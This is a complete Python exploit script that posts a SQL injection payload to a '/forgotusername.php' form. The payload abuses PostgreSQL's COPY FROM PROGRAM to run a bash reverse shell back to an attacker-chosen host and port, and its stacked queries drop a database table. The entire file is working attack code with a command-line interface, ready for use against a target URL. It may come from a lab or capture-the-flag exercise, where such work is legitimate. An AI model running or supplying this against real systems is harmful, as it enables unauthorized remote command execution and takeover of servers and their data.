import requests
from urllib.parse import urljoin
import traceback
import argparse


def execute_revshell_as_postgres_user(target: str, lhost: str, lport: str):
    url = urljoin(target, "/forgotusername.php")

    data = {
        "username": f"""'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'echo "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" | bash'; DROP TABLE IF EXISTS cmd_exec; --"""
    }
    try:
        print("[*] Sending the request...")
        requests.post(url, data=data)
        print("[+] Request sent, check your listener!")
    except Exception as e:
        print("[-] Error sending the request: ", e)
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser(description="Get a reverse shell via exploiting a Postgresql writing into the file system")
    parser.add_argument("target", help="target's base URL (e.g, http://localhost:1234/)")
    parser.add_argument("lhost", help="Listener IP address")
    parser.add_argument("lport", help="Listener port")
    args = parser.parse_args()

    execute_revshell_as_postgres_user(args.target, args.lhost, args.lport)

if __name__ == "__main__":
    main()
